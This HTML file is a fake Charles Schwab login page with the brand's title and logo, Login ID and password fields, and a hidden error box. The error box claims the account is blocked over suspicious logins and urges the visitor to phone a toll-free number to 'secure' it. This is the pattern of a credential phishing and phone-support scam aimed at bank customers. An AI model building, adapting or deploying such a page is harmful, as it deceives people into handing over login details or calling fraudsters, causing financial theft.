<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Charles Schwab Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <img src="charles1.png" alt="Charles Schwab Logo" class="header-logo">
    </header>

    <div class="login-container">
        <div class="login-box">
            <h2>Log in to Schwab</h2>
            <form action="#" method="POST">
             <br>  <label for="loginID">Login ID</label>
                <input type="text" id="loginID" name="loginID" placeholder="Login ID" required>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Password" required>

                <div class="remember-me">
                    <input type="checkbox" id="rememberLogin" name="rememberLogin">
                    <label for="rememberLogin">Remember Login ID</label>
                </div>

                <label for="startPage">Start Page</label>
                <select id="startPage" name="startPage">
                    <option value="accountSummary">Account Summary</option>
                </select>

                <button type="submit">Log In</button>
            </form>
                 <!-- Error message box -->
        <div id="error-message-box" class="error-box" style="display: none;">
            <div class="error-text"> You've entered an incorrect username or password. Please try again.</div>
            <div class="error-code">
                <div class="error-icon">!</div>
                <div class="error-text">
                    Error code: 0X0047800 <br> 
                    Your account has been blocked due to some suspicious login attempts.<br>
                    Call now to secure your account: <br> <a href="tel:18444991812">+1-844-499-1812</a>
                </div>

            <div class="login-links">
                <a href="#">Forgot Login ID or Password?</a>
            </div>

            <!-- New User and Language section -->
            <div class="new-user-language">
                <a href="#">New User?</a>
                <select id="language" name="language">
                    <option value="english">English</option>
                    <option value="spanish">Espa√±ol</option>
                </select>
            </div>
        </div>

        <div class="background">
            <img src="charlsnew.jpeg" alt="Cityscape Background">
        </div>
    </div>
</body>
</html>
